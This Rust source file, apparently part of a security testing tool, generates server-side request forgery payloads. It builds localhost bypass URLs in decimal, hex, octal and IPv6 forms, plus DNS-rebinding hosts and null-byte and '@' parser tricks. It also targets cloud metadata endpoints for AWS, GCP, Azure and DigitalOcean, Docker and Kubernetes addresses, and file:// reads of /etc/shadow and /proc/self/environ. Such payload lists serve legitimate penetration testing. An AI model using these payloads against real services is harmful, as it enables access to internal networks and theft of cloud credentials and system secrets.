//! SSRF payload generation utilities

use std::net::Ipv4Addr;

/// Generate localhost URL variants for SSRF bypass
pub fn generate_localhost_variants(port: u16) -> Vec<UrlVariant> {
    vec![
        UrlVariant::new("localhost", format!("http://localhost:{}", port)),
        UrlVariant::new("127.0.0.1", format!("http://127.0.0.1:{}", port)),
        UrlVariant::new("IPv6 ::1", format!("http://[::1]:{}", port)),
        UrlVariant::new("IPv6 full", format!("http://[0:0:0:0:0:0:0:1]:{}", port)),
        UrlVariant::new(
            "Decimal IP",
            format!("http://{}:{}", ip_to_decimal(127, 0, 0, 1), port),
        ),
        UrlVariant::new(
            "Hex IP",
            format!("http://{}:{}", ip_to_hex(127, 0, 0, 1), port),
        ),
        UrlVariant::new("Octal IP", format!("http://0177.0.0.1:{}", port)),
        UrlVariant::new("localtest.me", format!("http://localtest.me:{}", port)),
        UrlVariant::new("nip.io", format!("http://127.0.0.1.nip.io:{}", port)),
        UrlVariant::new("sslip.io", format!("http://127.0.0.1.sslip.io:{}", port)),
        UrlVariant::new(
            "Null byte",
            format!("http://localhost%00.evil.com:{}", port),
        ),
        UrlVariant::new("@ bypass", format!("http://evil.com@localhost:{}", port)),
        UrlVariant::new("# bypass", format!("http://localhost#@evil.com:{}", port)),
    ]
}

/// Generate internal network URL variants
pub fn generate_internal_network_variants(port: u16) -> Vec<UrlVariant> {
    vec![
        // Private IP ranges
        UrlVariant::new("10.x.x.x", format!("http://10.0.0.1:{}", port)),
        UrlVariant::new("172.16.x.x", format!("http://172.16.0.1:{}", port)),
        UrlVariant::new("192.168.x.x", format!("http://192.168.1.1:{}", port)),
        // Cloud metadata endpoints
        UrlVariant::new(
            "AWS metadata",
            "http://169.254.169.254/latest/meta-data/".to_string(),
        ),
        UrlVariant::new(
            "GCP metadata",
            "http://metadata.google.internal/computeMetadata/v1/".to_string(),
        ),
        UrlVariant::new(
            "Azure metadata",
            "http://169.254.169.254/metadata/instance".to_string(),
        ),
        UrlVariant::new(
            "DigitalOcean",
            "http://169.254.169.254/metadata/v1/".to_string(),
        ),
        // Common internal services
        UrlVariant::new("Docker", format!("http://172.17.0.1:{}", port)),
        UrlVariant::new("Kubernetes", "http://kubernetes.default.svc/".to_string()),
    ]
}

/// URL variant with description
#[derive(Debug, Clone)]
pub struct UrlVariant {
    pub name: String,
    pub url: String,
}

impl UrlVariant {
    pub fn new(name: impl Into<String>, url: impl Into<String>) -> Self {
        Self {
            name: name.into(),
            url: url.into(),
        }
    }
}

/// Convert IPv4 address to decimal format
pub fn ip_to_decimal(a: u8, b: u8, c: u8, d: u8) -> u32 {
    ((a as u32) << 24) | ((b as u32) << 16) | ((c as u32) << 8) | (d as u32)
}

/// Convert IPv4 address to hex format
pub fn ip_to_hex(a: u8, b: u8, c: u8, d: u8) -> String {
    format!("0x{:02x}{:02x}{:02x}{:02x}", a, b, c, d)
}

/// Convert IPv4 address to octal format
pub fn ip_to_octal(a: u8, b: u8, c: u8, d: u8) -> String {
    format!("0{:o}.0{:o}.0{:o}.0{:o}", a, b, c, d)
}

/// Parse IPv4 address
pub fn parse_ipv4(ip: &str) -> Option<Ipv4Addr> {
    ip.parse().ok()
}

/// Generate file:// protocol variants
pub fn generate_file_variants() -> Vec<UrlVariant> {
    vec![
        UrlVariant::new("passwd", "file:///etc/passwd".to_string()),
        UrlVariant::new("shadow", "file:///etc/shadow".to_string()),
        UrlVariant::new("hosts", "file:///etc/hosts".to_string()),
        UrlVariant::new(
            "Windows hosts",
            "file:///C:/Windows/System32/drivers/etc/hosts".to_string(),
        ),
        UrlVariant::new("env", "file:///proc/self/environ".to_string()),
        UrlVariant::new("cmdline", "file:///proc/self/cmdline".to_string()),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ip_conversions() {
        assert_eq!(ip_to_decimal(127, 0, 0, 1), 2130706433);
        assert_eq!(ip_to_hex(127, 0, 0, 1), "0x7f000001");
    }

    #[test]
    fn test_localhost_variants() {
        let variants = generate_localhost_variants(8080);
        assert!(variants.len() > 5);
        assert!(variants.iter().any(|v| v.url.contains("localhost")));
        assert!(variants.iter().any(|v| v.url.contains("127.0.0.1")));
        assert!(variants.iter().any(|v| v.url.contains("[::1]")));
    }

    #[test]
    fn test_internal_variants() {
        let variants = generate_internal_network_variants(80);
        assert!(variants.iter().any(|v| v.url.contains("169.254.169.254")));
        assert!(variants.iter().any(|v| v.url.contains("10.0.0.1")));
    }
}
